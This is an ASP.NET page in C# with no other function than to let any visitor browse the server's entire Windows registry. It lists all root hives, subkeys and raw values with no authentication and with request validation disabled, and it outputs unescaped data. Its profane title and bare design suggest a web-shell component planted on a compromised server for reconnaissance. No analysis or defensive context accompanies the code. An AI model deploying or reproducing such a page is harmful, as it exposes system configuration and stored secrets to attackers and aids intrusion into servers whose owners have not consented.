<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" %>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
	public string strRegPath;
	public string RootKeys=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
	protected void Page_Load(object sender,EventArgs e)
	{
		RegPanel.Visible=true;
		strRegPath=Request["strRegPath"];
		if (strRegPath==null)
		{
			strRegPath=RegPath.Text;
		}
		if (strRegPath.Length<1)
		{
			RegInit();
		}
		else
		{
			RegList(strRegPath);
		}
	}
	public void RegInit()
	{
		ArrayList RootArr=new ArrayList(RootKeys.Split('|'));
		string RegList="<hr>";
		RegList+="<table width=90% border=0 align=center>";		
		RegList+="<tr><td width=40%><b>Name</b></td><td width=20%><b>Type</b></td><td width=40%><b>Value</b></td></tr>";
		foreach (string RootKey in RootArr)
		{
			RegList+="<tr><td><a href=javascript:jump('"+RootKey.Replace(@"\",@"\\")+"')>"+RootKey+"</a></td><td>RootKey</td><td></td></tr>";
		}
		RegList+="</table>";
		RegListLabel.Text=RegList;
	}
	
	public void RegList(string Reg_Path)
	{
		RegPath.Text=Reg_Path;
		string ParPath=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
		ParPath=Regex.Replace(ParPath,@"\\+","\\");
		ParPath=ParPath.Replace(" ","%20");
		string RegList="<hr>";
		RegList+="<table width=90% border=0 align=center>";
		RegList+="<tr><td width=40%><b>Name</b></td><td width=20%><b>Type</b></td><td width=40%><b>Value</b></td></tr>";
		RegList+="<tr><td><i><b><a href=javascript:jump('"+ParPath.Replace("\\",@"\\")+"');>|Parent Key|</a></b></i></td></tr>";
		try
		{
			string subpath;
			if (!Reg_Path.EndsWith("\\"))
			{
				Reg_Path=Reg_Path+"\\";
			}
			string subkey=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
			RegistryKey rk=null;
			RegistryKey sk;
			if (Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))
			{
				rk=Registry.LocalMachine;
			}
			else if (Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))
			{
				rk=Registry.ClassesRoot;
			}
			else if (Reg_Path.StartsWith("HKEY_CURRENT_USER"))
			{
				rk=Registry.CurrentUser;
			}
			else if (Reg_Path.StartsWith("HKEY_USERS"))
			{
				rk=Registry.Users;
			}
			else if (Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))
			{
				rk=Registry.CurrentConfig;
			}
			if (subkey.Length>1)
			{
				sk=rk.OpenSubKey(subkey);
			}
			else
			{
				sk=rk;
			}
			foreach (string strSubKey in sk.GetSubKeyNames())
			{
				subpath=Reg_Path+"\\"+strSubKey;
				subpath=Regex.Replace(subpath,@"\\+","\\");
				subpath=subpath.Replace(" ","%20");
				RegList+="<tr><td width=40%><a href=javascript:jump('"+subpath.Replace("\\",@"\\")+"')>"+strSubKey+"</td><td width=20%>&lt;SubKey&gt;</td><td width=40%>Null</td></tr>";
			}
			foreach (string strValueName in sk.GetValueNames())
			{
				RegList+="<tr><td width=40%>"+strValueName+"</td><td width=20%>"+sk.GetValueKind(strValueName).ToString()+"</td><td width=40%>"+GetRegValue(sk,strValueName)+"</td></tr>";
			}
		}
		catch (Exception error)
		{
			ShowErr(error.Message); 
		}
		RegList+="</table>";
		RegListLabel.Text=RegList;
	}
	public string GetRegValue(RegistryKey sk,string strValueName)
	{
		object buffer;
		string regstr="";
		try
		{
			buffer=sk.GetValue(strValueName,"NULL");
			if (buffer.GetType()==typeof(byte[]))
			{
				foreach (byte tmpbyte in (byte[])buffer)
				{
					if ((int)tmpbyte<16)
					{
						regstr+="0";
					}
					regstr+=tmpbyte.ToString("X");
				}
			}
			else
			{
				regstr=buffer.ToString();
			}
		}
		catch(Exception error)
		{
			ShowErr(error.Message);
		}
		return regstr;
	}
	public void echo(string str)
	{
		Response.Write(str);
	}
	public void ShowErr(string err)
	{
		ErrLabel.Text="<font color=\"red\"><b>Error: </b></font>"+err;
	}
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
	<title>Fuck</title>
	<script language="javascript">
		function jump(strpath){
			var frm=document.forms[0];
			frm.RegPath.value=strpath;
			frm.submit();
		}
	</script>
	<style type="text/css">
		A:link {
		  COLOR:#000000; TEXT-DECORATION:None
		}
		A:visited {
			   COLOR:#000000; TEXT-DECORATION:None
		}
		A:active {
			   COLOR:#000000; TEXT-DECORATION:None
		}
		A:hover {
			   COLOR:#000000; TEXT-DECORATION:underline
		}
		BODY {
			FONT-SIZE: 9pt;
			FONT-FAMILY: "Courier New";
			}
		</style>
	</head>
	<body>
		<form id="form1" runat="server">
			<div style="text-align: center">
				<asp:Panel ID="RegPanel" runat="server" Width="767px" EnableViewState="False" Visible="False">
					<div style="text-align: left">
						<asp:Label ID="ErrLabel" runat="server" Text="" Width="764px"/><br />
							<asp:TextBox ID="RegPath" runat="server" Width="700px"></asp:TextBox>&nbsp;
							<asp:Button ID="PathButton" runat="server" Text="GO" />
						<asp:Label ID="RegListLabel" runat="server" EnableViewState="False"></asp:Label>
					</div>
					<div style="text-align: center">
						<hr />
					</div>
				</asp:Panel>
			</div>
		</form>